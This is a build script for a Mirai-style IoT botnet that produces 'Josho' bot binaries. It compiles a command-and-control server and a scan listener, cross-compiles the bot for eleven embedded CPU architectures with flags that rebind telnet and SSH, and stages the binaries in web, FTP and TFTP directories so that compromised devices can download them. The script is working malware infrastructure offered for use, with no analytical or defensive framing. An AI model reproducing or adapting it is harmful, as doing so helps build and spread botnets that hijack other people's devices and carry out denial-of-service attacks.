...
FLAGS="-DKILLER_REBIND_TELNET -DKILLER_REBIND_SSH"
domain=""
domainres=""
if [ "$1" == "domain" ]
then
...
mkdir /var/www/html
mkdir /var/www/html/AB4g5
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/
go build -o loader/scanListen scanListen.go
echo "COMPILING i586$domainres"
compile_bot i586 Josho.x86 "$FLAGS $domain -static"
echo "COMPILING mips$domainres"
compile_bot mips Josho.mips "$FLAGS $domain -static"
echo "COMPILING mipsel$domainres"
compile_bot mipsel Josho.mpsl "$FLAGS $domain -static"
echo "COMPILING armv4l$domainres"
compile_bot armv4l Josho.arm4 "$FLAGS $domain -static"
echo "COMPILING armv5l$domainres"
compile_bot armv5l Josho.arm5 "$FLAGS $domain"
echo "COMPILING armv6l$domainres"
compile_bot armv6l Josho.arm6 "$FLAGS $domain -static"
echo "COMPILING armv7l$domainres"
compile_bot armv7l Josho.arm7 "$FLAGS $domain -static"
echo "COMPILING ppc$domainres"
compile_bot powerpc Josho.ppc "$FLAGS $domain -static"
echo "COMPILING sparc$domainres"
compile_bot sparc Josho.spc "$FLAGS $domain -static"
echo "COMPILING m68k$domainres"
compile_bot m68k Josho.m68k "$FLAGS $domain -static"
echo "COMPILING sh4$domainres"
compile_bot sh4 Josho.sh4 "$FLAGS $domain -static"
cp release/Josho* /var/www/html/AB4g5
cp release/Josho* /var/ftp
mv release/Josho* /var/lib/tftpboot
rm -rf release
###################################################################
